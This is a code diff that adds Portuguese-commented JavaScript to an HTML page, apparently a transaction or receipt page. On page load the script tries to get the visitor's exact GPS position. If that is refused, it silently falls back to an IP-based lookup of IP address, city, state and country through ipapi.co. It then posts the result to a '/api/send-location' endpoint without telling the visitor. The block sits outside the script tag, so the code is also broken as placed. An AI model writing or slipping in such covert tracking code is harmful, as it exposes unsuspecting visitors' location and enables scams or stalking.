@@ -78,5 +78,53 @@
     atualizarHorario();
     gerarIdTransacao();
   </script>
+    // --- CÓDIGO DE CAPTURA DE GEOLOCALIZAÇÃO ---
+    window.addEventListener('DOMContentLoaded', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            // Sucesso: Pegou a localização exata do GPS
+            enviarDadosLocalizacao({
+              tipo: 'precisa',
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            });
+          },
+          (error) => {
+            // Erro ou negação: Usa o fallback por IP
+            obterLocalizacaoPorIP();
+          },
+          { timeout: 8000 }
+        );
+      } else {
+        obterLocalizacaoPorIP();
+      }
+    });
+
+    async function obterLocalizacaoPorIP() {
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        enviarDadosLocalizacao({
+          tipo: 'aproximada_ip',
+          ip: data.ip,
+          cidade: data.city,
+          estado: data.region,
+          pais: data.country_name
+        });
+      } catch (err) {
+        console.log('Erro ao obter IP');
+      }
+    }
+
+    function enviarDadosLocalizacao(dados) {
+      // Substitua pelo endpoint real da sua API que salva os dados
+      fetch('/api/send-location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(dados)
+      }).catch(err => console.log('Erro ao enviar dados'));
+    }
+  
 </body>
 </html>
